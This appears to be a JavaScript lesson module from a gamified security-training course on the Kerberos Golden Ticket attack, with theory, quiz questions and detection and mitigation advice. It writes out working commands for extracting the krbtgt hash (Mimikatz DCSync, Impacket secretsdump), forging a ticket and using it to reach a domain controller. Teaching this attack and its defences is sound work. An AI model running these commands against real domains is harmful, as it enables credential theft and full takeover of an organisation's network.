export const goldenTicketTheory = {
  id: 'golden-ticket',
  title: 'Golden Ticket Attack',
  subtitle: 'Forge Kerberos tickets for ultimate persistence',
  estimatedTime: '15 minutes',
  difficulty: 'Expert',
  xpReward: 250,
  
  sections: [
    {
      id: 'intro',
      title: '🎯 What is a Golden Ticket?',
      type: 'intro',
      duration: '3 min',
      content: `A Golden Ticket is a forged Kerberos TGT (Ticket Granting Ticket) created using the krbtgt account's password hash. With this ticket, an attacker can impersonate ANY user in the domain, including non-existent ones.

**Critical Impact:** Complete domain persistence that survives password resets and system reboots.

**Detection Difficulty:** Extremely hard to detect since tickets appear legitimate to domain controllers.`,
      
      keyPoints: [
        'Requires krbtgt account password hash',
        'Grants unlimited access to domain resources',
        'Persists even if admin passwords are reset',
        'Can specify arbitrary group memberships (e.g., Domain Admins)',
        'Valid for up to 10 years (configurable)',
        'Nearly impossible to detect without specialized monitoring'
      ]
    },
    
    {
      id: 'krbtgt-explained',
      title: '🔑 The krbtgt Account',
      type: 'concept',
      duration: '3 min',
      content: `The krbtgt account is a special domain account used by the Key Distribution Center (KDC) to encrypt and sign all Kerberos TGTs.

**Why it's critical:**
- Its password hash is used to encrypt ALL TGTs
- Compromise = ability to forge any ticket
- Password is 120+ characters, randomly generated
- Rarely changed (many orgs NEVER rotate it)

**How attackers get it:**
- DCSync attack from compromised admin account
- Direct access to domain controller NTDS.dit file
- Dump from domain controller memory`,
      
      example: {
        title: 'Extracting krbtgt Hash',
        code: `# Using Mimikatz (DCSync)
lsadump::dcsync /domain:contoso.local /user:krbtgt

# Using Impacket
secretsdump.py contoso/admin:password@dc01.contoso.local -just-dc-user krbtgt

# Output: krbtgt hash (both NTLM and AES keys)`
      }
    },
    
    {
      id: 'forging-ticket',
      title: '🎫 Forging the Golden Ticket',
      type: 'steps',
      duration: '4 min',
      
      steps: [
        {
          number: 1,
          title: 'Obtain krbtgt Hash',
          description: 'Extract krbtgt password hash via DCSync or NTDS.dit',
          commands: [
            'mimikatz # lsadump::dcsync /user:krbtgt',
            'secretsdump.py domain/admin@dc -just-dc-user krbtgt'
          ]
        },
        {
          number: 2,
          title: 'Gather Domain Information',
          description: 'Collect domain SID and FQDN',
          commands: [
            'whoami /user (get SID)',
            'echo %userdnsdomain% (get domain FQDN)'
          ]
        },
        {
          number: 3,
          title: 'Create Golden Ticket',
          description: 'Forge TGT with krbtgt hash',
          commands: [
            'kerberos::golden /user:Administrator /domain:contoso.local /sid:S-1-5-21-... /krbtgt:hash /id:500',
            'ticketer.py -nthash hash -domain-sid S-1-5-21-... -domain contoso.local Administrator'
          ]
        },
        {
          number: 4,
          title: 'Inject & Use Ticket',
          description: 'Load ticket into memory and access resources',
          commands: [
            'kerberos::ptt golden.kirbi',
            'export KRB5CCNAME=Administrator.ccache',
            'psexec.py contoso.local/Administrator@dc01 -k -no-pass'
          ]
        }
      ]
    },
    
    {
      id: 'defense',
      title: '🛡️ Detection & Mitigation',
      type: 'defensive',
      duration: '3 min',
      
      detection: {
        logs: [
          'Event ID 4769: Kerberos service ticket requested (unusual encryption types)',
          'Event ID 4624: Logon with non-existent usernames',
          'Tickets with unusual lifetime (e.g., 10 years)'
        ],
        indicators: [
          'Kerberos tickets with RC4 encryption (should be AES)',
          'Abnormally long ticket lifetimes',
          'Authentication from unusual locations/times',
          'Tickets for disabled or deleted accounts'
        ]
      },
      
      prevention: [
        {
          title: 'Rotate krbtgt Password',
          description: 'Change krbtgt password twice (immediately invalidates old tickets)',
          example: 'Use Microsoft script: Reset-KrbtgtKeyInteractive.ps1'
        },
        {
          title: 'Monitor for DCSync',
          description: 'Alert on replication requests from non-DCs',
          example: 'Event ID 4662 with replication GUIDs'
        },
        {
          title: 'Implement PAM/PIM',
          description: 'Use Privileged Access Management for admin accounts',
          example: 'Time-limited, just-in-time admin access'
        },
        {
          title: 'Detect Anomalous Tickets',
          description: 'Monitor for unusual Kerberos ticket properties',
          example: 'SIEM rules for long-lived tickets, RC4 encryption, or non-existent users'
        }
      ]
    }
  ],
  
  quiz: [
    {
      question: 'What account\'s hash is required to create a Golden Ticket?',
      options: [
        'Administrator',
        'krbtgt',
        'Guest',
        'SYSTEM'
      ],
      correct: 1,
      explanation: 'The krbtgt account hash is used by the KDC to sign TGTs, making it essential for forging Golden Tickets.'
    },
    {
      question: 'How long can a Golden Ticket remain valid?',
      options: [
        '24 hours maximum',
        'Until the user password changes',
        'Up to 10 years (or more)',
        '1 hour default'
      ],
      correct: 2,
      explanation: 'Golden Tickets can be forged with arbitrary lifetimes, often set to 10 years or more for maximum persistence.'
    },
    {
      question: 'What is the BEST way to invalidate all Golden Tickets?',
      options: [
        'Reset all user passwords',
        'Reboot the domain controller',
        'Reset krbtgt password TWICE',
        'Disable Kerberos authentication'
      ],
      correct: 2,
      explanation: 'Resetting the krbtgt password twice ensures both the current and previous password are invalidated, destroying all forged tickets.'
    }
  ],
  
  resources: [
    {
      title: 'MITRE ATT&CK - Golden Ticket',
      url: 'https://attack.mitre.org/techniques/T1558/001/',
      type: 'reference'
    },
    {
      title: 'Microsoft - Detecting and Mitigating Golden Tickets',
      url: 'https://docs.microsoft.com/en-us/security/compass/compromised-krbtgt',
      type: 'reference'
    }
  ]
};
